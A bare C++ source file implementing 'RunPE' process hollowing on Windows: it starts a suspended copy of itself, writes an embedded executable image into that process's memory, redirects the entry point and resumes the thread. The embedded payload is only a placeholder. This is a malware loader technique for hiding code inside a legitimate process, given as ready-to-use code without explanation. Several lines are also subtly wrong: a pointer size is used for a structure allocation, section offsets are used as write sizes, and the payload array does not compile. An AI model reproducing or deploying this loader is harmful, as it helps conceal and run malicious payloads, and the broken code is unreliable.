#include <iostream>
#include <string>

#include <windows.h>
#include <TlHelp32.h>

auto RunPortableExecutable(HANDLE image) -> int
{
	
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	
	DWORD* ImageBase;
	void* pImageBase;

	int count;
	char CurrentFilePath[1024];

	IMAGE_DOS_HEADER* pImgDos = PIMAGE_DOS_HEADER(image);
	IMAGE_NT_HEADERS* pImgNt = PIMAGE_NT_HEADERS(DWORD(image) + pImgDos->e_lfanew);

	GetModuleFileNameA(0, CurrentFilePath, 1024);

	if (pImgNt->Signature == IMAGE_NT_SIGNATURE)
	{
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
		{
			
			CONTEXT* CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
			{
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(pImgNt->OptionalHeader.ImageBase), pImgNt->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				WriteProcessMemory(PI.hProcess, pImageBase, image, pImgNt->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < pImgNt->FileHeader.NumberOfSections; count++)
				{
					IMAGE_SECTION_HEADER* imgSectHeader = PIMAGE_SECTION_HEADER(DWORD(image) + pImgDos->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + imgSectHeader->VirtualAddress), LPVOID(DWORD(image) + imgSectHeader->PointerToRawData), imgSectHeader->PointerToRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&pImgNt->OptionalHeader.ImageBase), 4, 0);

				CTX->Eax = DWORD(pImageBase) + pImgNt->OptionalHeader.AddressOfEntryPoint;
				
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
				ResumeThread(PI.hThread);

				return 0;
			}
		}
	}
}


unsigned char rawData[] = {raw data binary};


auto main(void) -> int
{
	RunPortableExecutable(rawData);
}